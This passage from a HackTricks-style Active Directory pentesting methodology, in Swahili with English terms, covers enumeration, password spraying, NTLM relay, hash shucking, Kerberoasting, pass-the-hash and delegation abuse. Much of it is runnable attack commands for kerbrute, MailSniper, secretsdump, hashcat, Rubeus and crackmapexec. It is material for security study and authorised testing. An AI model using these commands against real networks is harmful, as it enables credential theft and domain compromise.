# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa Msingi

**Active Directory** inatumikia kama teknolojia ya msingi, ikiwarahisishia **network administrators** kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imetengenezwa ili iweze kupanuka, ikirahisisha kupanga idadi kubwa ya users kuwa ndani ya **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** kwa ngazi mbalimbali.

Muundo wa **Active Directory** unaundwa na tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** ni mkusanyiko wa objects, kama **users** au **devices**, yanayoshirikiana hifadhidata moja. **Trees** ni vikundi vya domains hivi vinavyohusishwa kwa muundo wa pamoja, na **forest** inawakilisha mkusanyiko wa trees kadhaa, zinazounganishwa kupitia **trust relationships**, zikifanya tabaka la juu zaidi la muundo wa shirika. Haki maalum za **access** na **communication rights** zinaweza kuteuliwa katika kila moja ya ngazi hizi.

Dhana kuu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Inahifadhi taarifa zote zinazohusiana na Active Directory objects.
2. **Object** – Inamaanisha entities ndani ya directory, ikiwa ni pamoja na **users**, **groups**, au **shared folders**.
3. **Domain** – Hutoa chombo cha kuhifadhi directory objects; domeini nyingi zinaweza kuishi ndani ya forest, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kikundi cha domains zinazo shiriki root domain moja.
5. **Forest** – Juu kabisa ya muundo wa shirika ndani ya Active Directory, ikijumuisha trees kadhaa zikiwa na **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa katikati na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Inatoa utaratibu wa kuhifadhi data kwa katikati na kusimamia mwingiliano kati ya **users** na **domains**, ikijumuisha **authentication** na utendaji wa **search**.
2. **Certificate Services** – Inasimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Inaunga mkono maombi ambayo yanatumia directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Inatoa uwezo wa **single-sign-on** ili kuhalalisha watumiaji kwa matumizi ya web applications nyingi kwa kikao kimoja.
5. **Rights Management** – Inasaidia kulinda kazi za hakimiliki kwa kudhibiti usambazaji wake usioidhinishwa na matumizi.
6. **DNS Service** – Ni muhimu kwa kutatua **domain names**.

Kwa maelezo ya kina angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji **understand** vizuri mchakato wa **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kutembelea [https://wadcoms.github.io/](https://wadcoms.github.io) kwa muhtasari wa haraka wa amri ambazo unaweza kutumia kuendeleza/enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una ufikiaji wa mazingira ya AD lakini huna credentials/sessions unaweza:

- **Pentest the network:**
- Scan the network, pata machines na ports zilizofunguka na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerating DNS inaweza kutoa taarifa kuhusu servers muhimu ndani ya domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Tazama General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) kupata maelezo zaidi kuhusu jinsi ya kufanya hivi.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye matoleo ya kisasa ya Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:

{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (lipa **special attention to the anonymous access**):

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata ufikiaji wa host kwa [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Toa majina/username kutoka kwenye dokumenti za ndani, mitandao ya kijamii, services (hasa web) ndani ya mazingira ya domain na pia kutoka vyanzo vinavyopatikana hadharani.
- Ikiwa unapata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu kanuni mbalimbali za AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Kanuni zinazotumika mara nyingi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila moja), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _random_ na nambari 3 _random_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Uorodheshaji wa watumiaji

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, kutuwezesha kubaini kuwa username ilikuwa batili. **Valid usernames** zitapokea ama **TGT in a AS-REP** response au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa mtumiaji anatakiwa kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya MS-NRPC (Netlogon) interface kwenye domain controllers. Mbinu inaita function ya `DsrGetDcNameEx2` baada ya ku-bind MS-NRPC interface ili kuangalia kama user au computer ipo bila credentials yoyote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) inatekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikiwa umepata mojawapo ya seva hizi kwenye mtandao, unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  na hii ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutoka kwa hatua ya recon uliyotakiwa kufanya kabla ya hili. Kwa jina na jina la ukoo unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuzalisha majina ya watumiaji yanayoweza kuwa halali.

### Kujua jina la mtumiaji mmoja au zaidi

Sawa, kwa hivyo unajua tayari una jina la mtumiaji halali lakini hakuna nywila... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** sifa _DONT_REQ_PREAUTH_ unaweza **kuomba ujumbe wa AS_REP** kwa mtumiaji huyo ambao utakuwa na baadhi ya data iliyofichwa kwa utegemezi wa nywila ya mtumiaji.
- [**Password Spraying**](password-spraying.md): Tujaribu nywila za **kawaida zaidi** kwa kila mmoja wa watumiaji waliogunduliwa, labda baadhi ya watumiaji wanatumia nywila mbaya (kumbuka sera ya nywila!).
- Kumbuka kwamba pia unaweza **spray OWA servers** ili kujaribu kupata ufikiaji wa seva za barua pepe za watumiaji.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Unaweza kuwa na uwezo wa **obtain** baadhi ya challenge **hashes** za **crack** kwa **poisoning** baadhi ya protocols za **network**:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umefanikiwa enumerate active directory utaweza kupata **more emails and a better understanding of the network**. Inawezekana uweze kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ili kupata ufikiaji wa AD env.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi AD recon state kwa kila engagement: `workspace create <name>` inazaa per-protocol SQLite DBs chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha views kwa `proto smb|mssql|winrm` na orodha ya secrets zilizokusanywa kwa `creds`. Osha kwa mikono data nyeti baada ya kumaliza: `rm -rf ~/.nxc/workspaces/<name>`.
- Ugunduzi wa subnet kwa haraka kwa **`netexec smb <cidr>`** unaonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Members wanaoonyesha `(signing:False)` ni **relay-prone**, wakati DCs mara nyingi zinahitaji signing.
- Tengeneza **hostnames in /etc/hosts** moja kwa moja kutoka NetExec output ili kurahisisha kulenga:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Ingawa **SMB relay to the DC is blocked** kwa sababu ya signing, endelea kuchunguza postura ya **LDAP**: `netexec ldap <dc>` inaonyesha `(signing:None)` / weak channel binding. DC yenye SMB signing required lakini LDAP signing disabled bado ni lengo linalofaa la **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Client-side printer credential leaks → uthibitishaji wa credentials za domain kwa wingi

- Printer/web UIs wakati mwingine **embed masked admin passwords in HTML**. Kutazama source/devtools kunaweza kufichua cleartext (mfano, `<input value="<password>">`), na hivyo kuruhusu Basic-auth access kwa scan/print repositories.
- Print jobs zilizopokelewa zinaweza kuwa na **plaintext onboarding docs** zenye nywila za kila mtumiaji. Hakikisha pairings zimepangwa vizuri wakati wa kujaribu:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kuiba NTLM Creds

Ikiwa unaweza **kufikia kompyuta nyingine au shares** kwa kutumia **null au guest user** unaweza **kuweka faili** (kama SCF file) ambazo zikifunguliwa zitafanya **trigger NTLM authentication dhidi yako** ili uweze **kuiba** **NTLM challenge** na kujaribu kuichambua:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** hutumia kila NT hash uliyonayo kama nyw. inayoweza kutumika kwa formats zingine, ambazo zenyewe zinategemea key material iliyotokana moja kwa moja na NT hash. Badala ya kuforce-brute passphrases ndefu kwenye Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes kwenye Hashcat’s NT-candidate modes na kumruhusu kuthibitisha password reuse bila kamwe kujua plaintext. Hii ni mbaya sana baada ya kuiba domain ambapo unaweza kuvuna maelfu ya NT hashes za sasa na za kihistoria.

Tumia shucking wakati:

- Una corpus ya NT kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu reuse katika domains/forests nyingine.
- Unakamata RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha kwa haraka reuse kwa passphrases ndefu zisizoweza kuvunjika na mara moja pivot kupitia Pass-the-Hash.

Mbinu hii **haifanyi kazi** dhidi ya aina za encryption ambazo keys zao sio NT hash (mfano, Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES-tu, lazima urejee kwa regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` pamoja na history ili kupiga set kubwa zaidi ya NT hashes (na thamani zao za zamani):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entries za history zinaongeza sana pool ya candidates kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 za awali kwa kila akaunti. Kwa njia zaidi za kuvuna siri za NTDS angalia:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutextract data ya SAM/SECURITY ya ndani na cached domain logons (DCC/DCC2). Ondoa duplicate na uambatane hashes hizo kwenye faili hilo lile `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex tu). Hashes zinazolingana zitakuambia mara moja ni principal gani anatumia password tena wakati Hashcat itakaponyesha candidate iliyoshinda.
- Upende candidates kutoka forest ile ile au trusted forest; hili linaongeza nafasi ya overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **lazima zibe raw 32-hex NT hashes**. Zima rule engines (hakuna `-r`, hakuna hybrid modes) kwa sababu mangling inaharibu candidate key material.
- Modes hizi sio kwa asili haraka zaidi, lakini keyspace ya NTLM (~30,000 MH/s kwenye M3 Max) ni ~100× ya haraka kuliko Kerberos RC4 (~300 MH/s). Kujaribu list iliyochaguliwa ya NT ni ghali kidogo kuliko kuchunguza password space nzima katika format ya polepole.
- Kila mara tumia **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zimetumwa hivi karibuni.
- Kwa sasa hakuna NT mode kwa AS-REQ Pre-Auth, na AES etypes (19600/19700) zinahitaji plaintext password kwa sababu keys zao zinatokana via PBKDF2 kutoka kwa UTF-16LE passwords, si raw NT hashes.

#### Mfano – Kerberoast RC4 (mode 35300)

1. Pata RC4 TGS kwa SPN lengwa ukiwa user mwenye privileges za chini (angalia ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck ticket na list yako ya NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat hutokana na kila NT candidate kuunda RC4 key na kuthibitisha `$krb5tgs$23$...` blob. Match inathibitisha kuwa service account inatumia moja ya NT hashes zako zilizopo.

3. Pivota mara moja kupitia PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Unaweza pia kurecover plaintext baadaye na `hashcat -m 1000 <matched_hash> wordlists/` ikiwa inahitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump cached logons kutoka workstation uliyo compromise:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Nakili mstari wa DCC2 wa user mwenye umuhimu na uiweke kwenye `dcc2_highpriv.txt` kisha shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Match itakayofanikiwa inatoa NT hash ambayo tayari ilijulikana katika list yako, ikithibitisha kuwa user aliyepo cached anatumia password ile ile. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au i-brute-force kwa fast NTLM mode ili kurecover string.

Workflow ile ile inatumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Mara match inapobainika unaweza kuanzisha relay, SMB/WMI/WinRM PtH, au ku-re-crack NT hash offline kwa masks/rules.

## Enumerating Active Directory WITH credentials/session

Kwa hatua hii unahitaji kuwa **umevamia credentials au session** ya akaunti halali ya domain. Ikiwa una credentials halali au shell kama domain user, **kumbuka** kuwa chaguzi zilizotajwa hapo awali bado ni njia za ku-compromise watumiaji wengine.

Kabla ya kuanza enumeration yenye authenticated unapaswa kujua ni nini **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kuwa na akaunti imevamiwa ni **hatua kubwa ya kuanza ku-compromise domain nzima**, kwa sababu utaweza kuanza **Active Directory Enumeration:**

Kuhusiana na [**ASREPRoast**](asreproast.md) sasa unaweza kupata kila user inayoweza kuwa vulnerable, na kuhusu [**Password Spraying**](password-spraying.md) unaweza kupata **orodha ya majina ya watumiaji yote** na kujaribu password ya akaunti iliyovamiwa, passwords zisizo na kitu na passwords mpya zinazotarajiwa.

- Unaweza kutumia [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Pia unaweza kutumia [**powershell for recon**](../basic-powershell-for-pentesters/index.html) ambayo itakuwa stealthier
- Pia unaweza [**use powerview**](../basic-powershell-for-pentesters/powerview.md) kutoa taarifa zaidi za kina
- Zana nyingine nzuri ya recon katika active directory ni [**BloodHound**](bloodhound.md). Si **stealthy** sana (kulingana na mbinu za collection unazotumia), lakini **ikiwa hutaki** kujali hilo, inastahili kujaribiwa. Pata wapi watumiaji wanaweza RDP, angalia path kwa groups nyingine, n.k.
- **Zana nyingine za automatiska za AD ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) kwani zinaweza kuwa na taarifa za kuvutia.
- Zana yenye GUI ambayo unaweza kutumia kuchanganua directory ni **AdExplorer.exe** kutoka kwenye **SysInternal** Suite.
- Unaweza pia kutafuta katika database ya LDAP kwa kutumia **ldapsearch** kutafuta credentials kwenye fields _userPassword_ & _unixUserPassword_, au hata _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa njia nyingine.
- Ikiwa unatumia **Linux**, unaweza pia kuchanganua domain kwa kutumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu zana za automatiska kama:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kuvuna watumiaji wote wa domain**

Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Katika Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana ndogo hii ndilo sehemu muhimu zaidi ya yote. Fungua links (hasa zile za cmd, powershell, powerview na BloodHound), jifunze jinsi ya kuchanganua domain na fanya mazoezi mpaka ujisikie una uhakika. Wakati wa assessment, hili litakuwa wakati muhimu wa kupata njia yako ya DA au kuamua kuwa hakuna kinachoweza kufanywa.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumika na services zinazohusiana na user accounts na kuvunja encryption yao—ambayo inategemea passwords za watumiaji—offline.

Maelezo zaidi hapa:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Mara tu unapopata credentials unaweza kuangalia kama una access kwa **mashine** yoyote. Kwa hilo, unaweza kutumia **CrackMapExec** kujaribu kuungana kwenye servers kadhaa kwa protocols tofauti, kulingana na matokeo ya port scans yako.

### Local Privilege Escalation

Ikiwa umevamia credentials au session kama domain user wa kawaida na una **access** kwa mtumiaji huyu kwenye **mashine yoyote** ndani ya domain, inashauriwa ujaribu kupata njia ya **kuongeza privileges mahali hapo (local)** na kutafuta credentials. Hii ni kwa sababu ni tu ukiwa na local administrator privileges ndipo utaweza **dump hashes za watumiaji wengine** katika memory (LSASS) na kwa karibu (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **sio kawaida** kabisa utakapo kupata **tickets** za current user zitakazokupa ruhusa ya kupata rasilimali zisizotarajiwa, lakini unaweza kuangalia:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umefanikiwa kuhesabu Active Directory utakuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Unaweza kuweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa baada ya kuwa na baadhi ya credentials za msingi unapaswa kuangalia kama unaweza **kupata** faili zozote za **kupendeza zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo kwa mkono lakini ni kazi ya kuchosha yenye kurudia-rudia (na hata zaidi ikiwa utakutana na mamia ya nyaraka unazohitaji kuangalia).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **access other PCs or shares** unaweza **kuweka files** (kama SCF file) ambazo zikigunduliwa zitaku**amsha uthibitisho wa NTLM dhidi yako** ili uweze **kuiba** **NTLM challenge** na kuizama:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Udhaifu huu uliruhusu mtumiaji yeyote aliyeidhinishwa **kuvamia domain controller**.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Kwa mbinu zinazofuata, mtumiaji wa kawaida wa domain haitoshi; unahitaji baadhi ya privileges/credentials maalum ili kufanya mashambulizi haya.**

### Hash extraction

Kwa bahati nzuri umefanikiwa **kuvamia akaunti ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ikijumuisha relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa ku-dump hash zote kutoka memory na local machine.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara utakapokuwa na hash ya mtumiaji**, unaweza kuitumia kwa **kuiga** mtumiaji huyo.\
Unahitaji kutumia tool ambayo itafanya **uthibitisho wa NTLM kwa kutumia** hash hiyo, **au** unaweza kuunda sessionlogon mpya na **kuingiza** hash hiyo ndani ya **LSASS**, ili pale **uthibitisho wowote wa NTLM unapofanywa**, **hash hiyo itatumika.** Chaguo la mwisho ndilo mimikatz inalofanya.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga kutumia hash ya NTLM ya mtumiaji kuomba tiketi za Kerberos, kama mbadala wa Pass The Hash kawaida juu ya protocol ya NTLM. Kwa hivyo, inaweza kuwa hasa ya manufaa katika mitandao ambapo protocol ya NTLM imezimwa na Kerberos pekee ndio inaruhusiwa kama protocol ya uthibitisho.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika njia ya shambulio ya Pass The Ticket (PTT), mashambulizi huiba tiketi ya uthibitisho ya mtumiaji badala ya nenosiri au thamani za hash. Tiketi hii iliyochukuliwa hutumika kuiga mtumiaji, kupata ufikiaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator** unapaswa kujaribu **ku-login locally** kwenye **PCs** nyingine ukitumia hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hili lina **kelele nyingi** na **LAPS** lingeweza **kudhibiti** hilo.

### MSSQL Abuse & Trusted Links

Kama mtumiaji ana ruhusa za **access MSSQL instances**, anaweza kutumia hilo **kutekeleza amri** kwenye mwenyeji wa MSSQL (ikiwa inafanya kazi kama SA), **kuiba** NetNTLM **hash** au hata kufanya **relay** **attack**.\
Pia, ikiwa instance ya MSSQL inatambulika (database link) na instance nyingine ya MSSQL. Ikiwa mtumiaji ana ruhusa juu ya database iliyotambulika, ataweza **kutumia uhusiano wa kuaminiana kutekeleza queries pia katika instance nyingine**. Uaminiano hizi zinaweza kuunganishwa mnyororo na katika hatua fulani mtumiaji anaweza kupata database iliyopangwa vibaya ambamo anaweza kutekeleza amri.\
**Viungo kati ya database vinafanya kazi hata kupitia forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite za inventory na deployment za tatu mara nyingi zina njia zenye nguvu kuelekea kwa credentials na utekelezaji wa code. Angalia:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Kama utapata Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una privileges za domain kwenye kompyuta hiyo, utaweza ku-dump TGTs kutoka kwenye kumbukumbu (memory) za watumiaji wote wanaoingia kwenye kompyuta.\
Hivyo, ikiwa **Domain Admin anaingia kwenye kompyuta**, utaweza ku-dump TGT yake na kujifanya yeye ukitumia [Pass the Ticket](pass-the-ticket.md).\
Shukrani kwa constrained delegation unaweza hata **kuvamia kwa moja kwa moja Print Server** (tumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa mtumiaji au kompyuta ameruhusiwa kwa "Constrained Delegation" itaweza **kujifanya mtumiaji yeyote ili kufikia huduma fulani kwenye kompyuta**.\
Kisha, ukifaulu **kupata hash** ya mtumiaji/kompyuta hii utaweza **kujifanya mtumiaji yeyote** (hata domain admins) ili kufikia huduma fulani.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa za **WRITE** juu ya Active Directory object ya kompyuta ya mbali kunaruhusu kupata utekelezaji wa code kwa **ruhusa zilizoinuliwa**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

